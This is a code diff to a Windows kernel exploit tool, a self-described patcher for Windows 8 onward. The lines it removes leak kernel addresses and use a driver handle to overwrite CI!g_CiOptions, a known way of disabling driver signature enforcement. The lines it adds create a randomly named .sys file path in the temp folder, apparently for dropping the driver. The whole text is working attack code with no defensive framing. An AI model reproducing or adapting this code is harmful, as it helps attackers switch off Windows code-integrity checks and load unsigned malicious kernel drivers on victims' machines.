@@ -3,6 +3,7 @@
  * Patcher for anything from Windows 8 to
  * present.
 !*/
+#define _GNU_SOURCE
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <winternl.h>
@@ -11,39 +12,18 @@
 #include "ci.h"
 #include "intel.h"
 
+
 int main(int argc, char **argv)
 {
-  HANDLE hDriver       = 0;
-  LPVOID CiImagepMem   = 0;
-  LPVOID CiImageBase   = 0;
-  LPVOID CigOptsBase   = 0;
-  LPVOID PhysAddr      = 0;
-  PPEB   PebPtr        = 0;
-  DWORD  CiImageLen    = 0;
-  ULONG  CurrentCiVal  = 0;
-  ULONG  CurrentCiFix  = 1;
-
-  CiImageBase = KeGetBase("CI.dll", &CiImageLen);
-  if ( (CiImageBase != NULL) )
+  CHAR  szTemporaryFolder[MAX_PATH + 1];
+  RtlSecureZeroMemory(&szTemporaryFolder, MAX_PATH + 1);
+  if ( GetTempPathA(MAX_PATH, (PCHAR)&szTemporaryFolder) != 0 )
   {
-    printf("[+] Leaked CI @ %p\n", CiImageBase);
-    if ( (CigOptsBase = GetCiOptions1(CiImageBase)) != NULL )
-    {
-      printf("[+] Leaked CI!g_CiOptions @ %p\n", CigOptsBase);
+	  PCHAR szDriverPath = NULL;
 
-      if ( (hDriver = GetHandle()) != NULL ) 
-      {
-        printf("[+] Opened Device Handle %p\n", hDriver);
-	MemCpy(hDriver, &CurrentCiVal, CigOptsBase, 4);
+	  asprintf(&szDriverPath, "%s%s.sys", (PCHAR)&szTemporaryFolder,
+			  RandomString(10));
 
-	printf("[+] CI!g_CiOptions = 0x%x\n", CurrentCiVal);
-	MemCpy(hDriver, CigOptsBase, &CurrentCiFix, 4);
-
-	printf("[+] Wrote 0x%x to CI!g_CiOptions\n", CurrentCiFix);
-	MemCpy(hDriver, &CurrentCiFix, CigOptsBase, 4);
-
-	printf("[+] CI!g_CiOptions = 0x%x\n", CurrentCiFix);
-      };
-    };
+	  printf("[+] Driver Temporary Path %s\n", szDriverPath);
   };
 };
